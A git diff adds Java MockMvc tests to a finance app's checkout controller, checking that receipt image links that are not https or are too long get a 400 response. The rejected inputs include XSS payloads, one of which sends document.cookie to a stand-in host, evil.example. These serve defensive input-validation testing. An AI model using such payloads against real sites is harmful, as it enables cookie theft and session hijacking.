@@ -50,6 +50,7 @@ import vn.edu.huit.finance.core.Service.LoginAttemptService;
 import vn.edu.huit.finance.core.Service.Search.TransactionSearchService;
 import vn.edu.huit.finance.core.Service.TokenBlacklistService;
 import vn.edu.huit.finance.core.Service.TransactionService;
+import vn.edu.huit.finance.core.Util.ImageUrls;
 
 import java.lang.reflect.Method;
 import java.lang.reflect.Parameter;
@@ -448,6 +449,44 @@ class TransactionControllerTest {
                 .andExpect(jsonPath("$.message").value(containsString("clientId")));
 
         verifyNoInteractions(transactionService);
+    }
+
+    // ------------------------------------------------------------- POST /checkout: the receipt image link (A9)
+
+    @ParameterizedTest
+    @ValueSource(strings = {"javascript:fetch('//evil.example/'+document.cookie)", "JavaScript:alert(1)",
+            "data:text/html,<script>alert(1)</script>", "http://img.example.com/1.jpg", "https://img.example.com/a b.jpg",
+            "//img.example.com/1.jpg"})
+    void aReceiptImageLinkThatIsNotHttpsIsRejectedWith400AndNeverReachesTheService(String imageUrl) throws Exception {
+        String body = checkoutBodyWith(",\"imageUrl\":\"" + imageUrl.replace("\"", "\\\"") + "\"");
+
+        mockMvc.perform(signedIn(withBody(HttpMethod.POST, URL + "/checkout", body)))
+                .andExpect(status().isBadRequest())
+                .andExpect(jsonPath("$.code").value(400))
+                .andExpect(jsonPath("$.message").value(containsString(ImageUrls.MSG_INVALID)));
+
+        verifyNoInteractions(transactionService);
+    }
+
+    @Test
+    void aReceiptImageLinkLongerThanTheColumnIsRejectedWith400() throws Exception {
+        String prefix = "https://img.example.com/";
+        String tooLong = prefix + "x".repeat(ImageUrls.MAX_LENGTH - prefix.length() + 1);
+
+        mockMvc.perform(signedIn(withBody(HttpMethod.POST, URL + "/checkout", checkoutBodyWith(",\"imageUrl\":\"" + tooLong + "\""))))
+                .andExpect(status().isBadRequest());
+
+        verifyNoInteractions(transactionService);
+    }
+
+    @ParameterizedTest
+    @ValueSource(strings = {",\"imageUrl\":\"https://res.cloudinary.com/demo/image/upload/v1/r.jpg\"",
+            ",\"imageUrl\":\"HTTPS://img.example.com/1.jpg\"", ",\"imageUrl\":\"\"", ",\"imageUrl\":null", ""})
+    void anHttpsReceiptImageLinkOrNoneIsAccepted(String extraFields) throws Exception {
+        when(transactionService.createMyTransaction(any())).thenReturn(Map.of("transactionId", 5));
+
+        mockMvc.perform(signedIn(withBody(HttpMethod.POST, URL + "/checkout", checkoutBodyWith(extraFields))))
+                .andExpect(status().isOk());
     }
 
     // ------------------------------------------------------------- POST /checkout: the answer of the AI for a scan
